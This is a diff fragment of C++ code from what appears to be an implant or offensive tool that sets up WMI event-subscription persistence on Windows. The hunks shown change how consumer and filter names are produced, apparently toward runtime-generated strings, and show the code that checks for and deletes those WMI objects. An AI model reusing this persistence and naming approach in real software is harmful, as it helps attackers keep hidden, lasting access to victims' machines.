@@ -431,7 +431,7 @@ BOOL IsWmiPersistenceInstalled() {
 
     std::wstring query =
         L"SELECT * FROM CommandLineEventConsumer WHERE Name='" +
-        std::wstring(WMI_CMD_CONSUMER) + L"'";
+        std::wstring(WMI_CMD_CONSUMER()) + L"'";
 
     IEnumWbemClassObject* pEnum = nullptr;
     HRESULT hr = pSvc->ExecQuery(
@@ -470,11 +470,12 @@ BOOL RemoveWmiPersistence() {
     };
 
     std::wstring consPath    = L"CommandLineEventConsumer.Name=\"" +
-                               std::wstring(WMI_CMD_CONSUMER) + L"\"";
+                               std::wstring(WMI_CMD_CONSUMER()) + L"\"";
     std::wstring scriptPath  = L"ActiveScriptEventConsumer.Name=\"" +
-                               std::wstring(WMI_SCRIPT_CONSUMER) + L"\"";
+                               std::wstring(WMI_SCRIPT_CONSUMER()) + L"\"";
     std::wstring filterPath  = L"__EventFilter.Name=\"" +
-                               std::wstring(WMI_FILTER_NAME) + L"\"";
+                               std::wstring(WMI_FILTER_NAME()) + L"\"";
+
 
     // Delete bindings (must go first)
     del(L"__FilterToConsumerBinding.Consumer=\"" + consPath +
